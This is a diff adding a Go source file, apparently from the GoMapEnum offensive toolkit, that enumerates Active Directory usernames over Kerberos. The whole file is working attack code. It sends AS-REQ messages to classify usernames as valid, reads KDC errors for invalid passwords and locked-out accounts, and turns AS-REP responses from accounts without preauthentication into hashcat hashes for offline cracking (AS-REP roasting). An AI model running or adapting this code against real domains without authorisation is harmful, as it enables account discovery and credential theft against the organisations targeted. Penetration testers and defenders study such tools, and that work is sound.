@@ -1,0 +1,163 @@
+package kerberos
+
+import (
+	"GoMapEnum/src/utils"
+	"encoding/hex"
+	"fmt"
+	"html/template"
+	"os"
+	"strings"
+
+	kclient "github.com/nodauf/gokrb5/v8/client"
+	kconfig "github.com/nodauf/gokrb5/v8/config"
+	"github.com/nodauf/gokrb5/v8/iana/errorcode"
+	"github.com/nodauf/gokrb5/v8/messages"
+)
+
+const krb5ConfigTemplateDNS = `[libdefaults]
+dns_lookup_kdc = true
+default_realm = {{.Realm}}
+`
+
+const krb5ConfigTemplateKDC = `[libdefaults]
+default_realm = {{.Realm}}
+[realms]
+{{.Realm}} = {
+	kdc = {{.DomainController}}
+	admin_server = {{.DomainController}}
+}
+`
+
+type KerbruteSession struct {
+	Domain       string
+	Realm        string
+	Kdcs         map[int]string
+	ConfigString string
+	Config       *kconfig.Config
+	Verbose      bool
+	SafeMode     bool
+	HashFile     *os.File
+}
+
+type KerbruteSessionOptions struct {
+	Domain           string
+	DomainController string
+	Verbose          bool
+	SafeMode         bool
+	Downgrade        bool
+	HashFilename     string
+}
+
+func (options *Options) TestUsername(username string) (bool, error) {
+	// client here does NOT assume preauthentication (as opposed to the one in TestLogin)
+
+	cl := kclient.NewWithPassword(username, options.Domain, utils.RandomString(5), options.kerberosConfig, kclient.DisablePAFXFAST(true), kclient.Proxy(options.ProxyTCP))
+	req, err := messages.NewASReqForTGT(cl.Credentials.Domain(), cl.Config, cl.Credentials.CName())
+	if err != nil {
+		fmt.Printf(err.Error())
+	}
+	b, err := req.Marshal()
+	if err != nil {
+		return false, err
+	}
+	rb, err := cl.SendToKDC(b, options.Domain)
+
+	if err == nil {
+		// If no error, we actually got an AS REP, meaning user does not have pre-auth required
+		var ASRep messages.ASRep
+		err = ASRep.Unmarshal(rb)
+		if err != nil {
+			// something went wrong, it's not a valid response
+			return false, err
+		}
+		hash, err := asRepToHashcat(ASRep)
+		if err != nil {
+			options.Log.Debug("[!] Got encrypted TGT for %s, but couldn't convert to hash: %s", ASRep.CName.PrincipalNameString(), err.Error())
+
+		} else {
+			options.Log.Success("[+] %s has no pre auth required. Dumping hash to crack offline:\n%s", ASRep.CName.PrincipalNameString(), hash)
+		}
+		return true, nil
+	}
+	e, ok := err.(messages.KRBError)
+	if !ok {
+		return false, err
+	}
+	switch e.ErrorCode {
+	case errorcode.KDC_ERR_PREAUTH_REQUIRED:
+		return true, nil
+	default:
+		return false, err
+
+	}
+}
+
+func (options *Options) dumpASRepHash(asrep messages.ASRep) {
+}
+
+func buildKrb5Template(realm, domainController string) string {
+	data := map[string]interface{}{
+		"Realm":            realm,
+		"DomainController": domainController,
+	}
+	var kTemplate string
+	if domainController == "" {
+		kTemplate = krb5ConfigTemplateDNS
+	} else {
+		kTemplate = krb5ConfigTemplateKDC
+	}
+	t := template.Must(template.New("krb5ConfigString").Parse(kTemplate))
+	builder := &strings.Builder{}
+	if err := t.Execute(builder, data); err != nil {
+		panic(err)
+	}
+	return builder.String()
+}
+
+// handleKerbError return a boolean to indicate if the error is important or only a debug and rewrite the error string
+func handleKerbError(err error) (bool, string) {
+	eString := err.Error()
+
+	// handle non KRB errors
+	if strings.Contains(eString, "client does not have a username") {
+		return true, "Skipping blank username"
+	}
+	if strings.Contains(eString, "Networking_Error: AS Exchange Error") {
+		return false, "NETWORK ERROR - Can't talk to KDC. Aborting..."
+	}
+	if strings.Contains(eString, " AS_REP is not valid or client password/keytab incorrect") {
+		return true, "Got AS-REP (no pre-auth) but couldn't decrypt - bad password"
+	}
+
+	// handle KRB errors
+	if strings.Contains(eString, "KDC_ERR_WRONG_REALM") {
+		return false, "KDC ERROR - Wrong Realm. Try adjusting the domain? Aborting..."
+	}
+	if strings.Contains(eString, "KDC_ERR_C_PRINCIPAL_UNKNOWN") {
+		return true, "User does not exist"
+	}
+	if strings.Contains(eString, "KDC_ERR_PREAUTH_FAILED") {
+		return true, "Invalid password"
+	}
+	if strings.Contains(eString, "KDC_ERR_CLIENT_REVOKED") {
+		return true, "USER LOCKED OUT"
+	}
+	if strings.Contains(eString, " AS_REP is not valid or client password/keytab incorrect") {
+		return true, "Got AS-REP (no pre-auth) but couldn't decrypt - bad password"
+	}
+	if strings.Contains(eString, "KRB_AP_ERR_SKEW Clock skew too great") {
+		return true, "Clock skew too great"
+	}
+
+	return false, eString
+}
+
+// credits https://github.com/ropnop/kerbrute/blob/9cfb81e4fab8037acb44c678773ca3f93bc2b39c/util/hash.go#L9
+func asRepToHashcat(asrep messages.ASRep) (string, error) {
+	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
+		asrep.EncPart.EType,
+		asrep.CName.PrincipalNameString(),
+		asrep.CRealm,
+		hex.EncodeToString(asrep.EncPart.Cipher[:16]),
+		hex.EncodeToString(asrep.EncPart.Cipher[16:])), nil
+}
